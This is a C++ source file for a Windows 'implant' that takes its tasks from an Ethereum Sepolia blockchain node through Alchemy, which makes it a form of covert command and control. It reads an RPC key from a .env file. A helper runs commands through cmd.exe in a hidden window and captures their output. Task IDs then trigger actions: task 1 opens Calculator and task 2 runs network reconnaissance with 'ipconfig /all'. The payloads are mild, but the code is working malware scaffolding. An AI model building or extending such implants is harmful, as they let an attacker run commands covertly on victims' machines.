#include "../include/rpcengine.h"
#include "../include/HTTPClient.h"
#include <iostream>
#include <fstream>
#include <string>
#include <cstdint>
#include <algorithm>
#include <windows.h>

// Lightweight .env parser for the implant
std::string getEnvVar(const std::string& filepath, const std::string& key) {
    std::ifstream file(filepath);
    std::string line;
    std::string searchKey = key + "=";
    
    while (std::getline(file, line)) {
        if (line.find(searchKey) == 0) { // If the line starts with our key
            std::string val = line.substr(searchKey.length());
            // Strip any double quotes that Foundry requires
            val.erase(std::remove(val.begin(), val.end(), '\"'), val.end());
            return val;
        }
    }
    return "";
}

uint64_t parseTaskID(const std::string& hexStr) {
    if (hexStr.empty() || hexStr == "0x" || hexStr.find("ERROR") != std::string::npos) return 0;
    try { return std::stoull(hexStr, nullptr, 16); } 
    catch (...) { return 0; }
}

#include <windows.h>
#include <string>
#include <vector>

std::string executeShellCommand(const std::string& command) {
    std::string result = "";
    HANDLE hReadPipe = NULL;
    HANDLE hWritePipe = NULL;

    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    if(!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
        return "[-] Failed to create pipe!!";
    }

    // Pro-Tip: Prevent the child process from inheriting the Read end of the pipe
    SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = hWritePipe;
    si.hStdError = hWritePipe; // Catch errors too!

    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));

    // FIXED: Added the space
    std::string full_command = "cmd.exe /c " + command;
    
    // FIXED: Create a safe, mutable buffer for CreateProcessA
    std::vector<char> cmdBuffer(full_command.begin(), full_command.end());
    cmdBuffer.push_back('\0'); // Null-terminate

    if(!CreateProcessA(
            NULL,
            cmdBuffer.data(), // Safe, mutable pointer
            NULL,
            NULL,
            TRUE,
            CREATE_NO_WINDOW,
            NULL,
            NULL,
            &si,
            &pi
    )) {
        CloseHandle(hWritePipe);
        CloseHandle(hReadPipe);
        return "[-] CreateProcessA failed!";
    }

    // Close our copy of the write pipe so ReadFile doesn't hang
    CloseHandle(hWritePipe);

    char buffer[4096];
    DWORD bytesRead;
    
    // Read the output until the pipe is empty
    while(ReadFile(hReadPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
        buffer[bytesRead] = '\0';
        result += buffer;
    }

    // Clean up
    CloseHandle(hReadPipe);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return result;
}

// Helper to convert Ethereum Hex payload to ASCII string
std::string hexToAscii(const std::string& hexStr) {
    std::string ascii = "";
    // Start at index 2 to skip the "0x"
    for (size_t i = 2; i < hexStr.length(); i += 2) {
        std::string byteString = hexStr.substr(i, 2);
        char byte = (char)strtol(byteString.c_str(), NULL, 16);
        if (byte != '\0') { // Ignore empty null bytes
            ascii += byte;
        }
    }
    return ascii;
}

int main() {
    std::cout << "[*] Waking up implant. Loading from .env..." << std::endl;

    // 1. Read the key dynamically from your existing Foundry .env file
    std::string apiKey = getEnvVar("../hub/.env", "SEPOLIA_RPC_URL");
    
    if (apiKey.empty()) {
        std::cout << "[-] FATAL: Could not locate SEPOLIA_RPC_URL in ../hub/.env" << std::endl;
        return 1;
    }

    std::wstring wApiKey(apiKey.begin(), apiKey.end());
    std::string taskRequest = Rpcengine::buildTaskQueryReq();
    
    std::wstring host = L"eth-sepolia.g.alchemy.com";
    std::wstring path = L"/v2/" + wApiKey;

    std::cout << "[*] Polling Sepolia Hub for tasks..." << std::endl;
    std::string response = HTTPClient::postRequest(host, path, taskRequest);

    // 2. Extract and Parse
    std::string rawHex = Rpcengine::extractResults(response);
    uint64_t currentTask = parseTaskID(rawHex);
    
    std::cout << "[+] Current Task ID on Blockchain: " << currentTask << std::endl;

    // 3. The Execution Router
    if (currentTask == 0) {
        std::cout << "[zZz] No active tasks (Task 0). Standing by." << std::endl;
    } 
    else if (currentTask == 1) {
        std::cout << "[!] EXECUTE TASK 1: Popping Calculator" << std::endl;
        system("calc.exe"); 
    }
    else if (currentTask == 2) {
        std::cout << "[!] EXECUTE TASK 2: Network Reconnaissance" << std::endl;
        system("ipconfig /all");
    }
    else {
        std::cout << "[?] Unknown Task ID: " << currentTask << ". Ignoring." << std::endl;
    }

    return 0;
}